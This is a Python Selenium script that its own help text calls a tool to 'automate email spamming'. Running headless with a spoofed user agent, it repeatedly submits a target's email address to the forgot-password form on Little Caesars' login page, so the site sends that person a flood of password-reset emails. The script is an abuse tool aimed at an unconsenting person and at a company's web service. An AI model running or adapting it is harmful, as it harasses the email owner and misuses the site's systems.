import os
import sys
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import argparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Redirect stdout and stderr to logging
sys.stdout = logging.StreamHandler(sys.stdout)
sys.stderr = logging.StreamHandler(sys.stderr)

# Initialize counters
successful_clicks = 0
forgot_password_clicks = 0
total_attempts = 0

def test(driver):
    global successful_clicks
    try:
        div = driver.find_element(By.CSS_SELECTOR, '.css-1fpjypo')
        button = div.find_element(By.TAG_NAME, 'button')
        button.click()
        successful_clicks += 1
        return True
    except NoSuchElementException:
        logging.error("Element not found.")
        return False

def click_forgot_password_link(driver):
    global forgot_password_clicks
    try:
        forgot_password_link = driver.find_element(By.CSS_SELECTOR, 'a[data-testid="login-form__forgot-password-link"]')
        forgot_password_link.click()
        forgot_password_clicks += 1
        logging.info("\033[92mClicked on Forgot Password link.\033[0m")
    except NoSuchElementException:
        logging.error("\033[91mForgot Password link not found.\033[0m")

def enter_email(driver, email):
    try:
        email_input = driver.find_element(By.CSS_SELECTOR, 'input[data-testid="forgotPassword__email"]')
        email_input.clear()
        email_input.send_keys(email)
        logging.info("\033[93mEntered email: {}\033[0m".format(email))
    except NoSuchElementException:
        logging.error("\033[91mEmail input field not found.\033[0m")

# Setup Chrome options
options = webdriver.ChromeOptions()

# Make it run headless
options.add_argument('--headless')
# Increase the browser window size
options.add_argument("--window-size=1920,1080")
# Disable images
options.add_argument("--blink-settings=imagesEnabled=false")
# Use a specific user agent
options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")
# Enable JavaScript
options.add_argument("--enable-javascript")

# Specify the path to your ChromeDriver executable
driver = webdriver.Chrome(options=options)

# Navigate to the page
driver.get('https://littlecaesars.com/en-us/login/')

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Automate email spamming.')
parser.add_argument('email', type=str, help='The email to spam.')
parser.add_argument('times', type=int, help='The number of times to spam the email.', default=1)
args = parser.parse_args()

# Validate arguments
if not args.email or not args.times:
    logging.error("Email and times arguments are required.")
    sys.exit(1)

# check if the number of times is less than 1
if args.times < 1:
    logging.error("Number of times should be greater than or equal to 1.")
    sys.exit(1)

# Automate the clicks
for _ in range(args.times + 4):
    total_attempts += 1
    if test(driver):
        enter_email(driver, args.email)
        time.sleep(2)
    else:
        click_forgot_password_link(driver)
        time.sleep(1)
        # Attempt to enter the email again after clicking the forgot password link
        enter_email(driver, args.email)
        time.sleep(2)

# Display statistics
logging.info(f"Website: {driver.current_url}")
logging.info(f"Statistics:")
logging.info(f"Total Attempts: {total_attempts}")
logging.info(f"Successful Clicks: {successful_clicks}")
logging.info(f"Forgot Password Clicks: {forgot_password_clicks}")

driver.quit()
